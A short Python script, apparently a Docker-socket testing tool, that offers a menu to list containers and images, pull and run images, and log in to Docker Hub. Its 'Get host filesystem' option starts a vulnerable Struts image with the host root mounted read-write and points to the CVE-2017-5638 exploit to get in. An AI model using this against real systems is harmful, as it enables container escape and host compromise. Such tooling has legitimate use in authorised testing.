#!/bin/python

import docker

client = docker.from_env()


def get_environment():
    try:
        client.info()
    except:
        print ("No docker socket found")


def list_containers():
    containers = client.containers.list()
    print ("ID  Name    Image    Status")
    for container in containers:
        print(container.short_id + "    " + container.name + "  " + container.image.tags[0] + " "  + container.status)

def list_images():
    images = client.images.list()
    print ("ID  Tag")
    for image in images:
        print (image.short_id + "    " + image.tags[0])


def list_volumes():
    volumes = client.volumes.list()
    print ("ID  Name")
    for volume in volumes:
        print (volume.short_id + "    " + volume.name)

def pull_image():
    tag = input("Introduce the image you want to pull <rpository>:<tag>: ")
    client.images.pull(tag)

def docker_login():
    username = input("Introduce your usarname of Docker Hub: ")
    password = input("Introduce you password of Docker Hub: ")
    login = client.login(username=username, password=password, reauth=True)
    print(login)

def docker_run():
    image = input("Introduce the image you want to run <rpository>:<tag>: ")
    command = input("Introduce the command you want to run on the container: ")
    detatch = input("You want to run it on background? (y/n): " )
    det = False
    if detatch == "y":
        det = True
    elif detatch != "n": 
        print("Introduce y/n")
    output = client.containers.run(image, command, detach=det)
    print(output)

def docker_pwn():
    client.containers.run("jrrdev/cve-2017-5638:latest", detach=True,  volumes={'/': {'bind': '/tmp/', 'mode': 'rw'}}, ports={'8080/tcp':8080})
    print("The host file system is exposed through port 8080 use the cve-2017-5638 exploit to get inside. The host file system is on /tmp")

def selector():
    print("Script to test Docker socket inside a container\n")
    print("Select one of the following options")
    print("1. List running containers on host")
    print("2. List images on host")
    print("3. List volumes")
    print("4. Pull image")
    print("5. Docker login (You're going to need it if you want to pull an image)")
    print("6. Run a Docker image")
    print("7. Get host filesystem")
    selected = input("Choose your option: ")
    return selected


def main():
    get_environment()
    while(True):
        selected = selector()
        if selected == "1":
            list_containers()
        elif selected == "2":
            list_images()
        elif selected == "3":
            list_volumes()
        elif selected == "4":
            pull_image() 
        elif selected == "5":
            docker_login() 
        elif selected == "6":
            docker_run() 
        elif selected == "7":
            docker_pwn() 

if __name__ == "__main__":
    main()
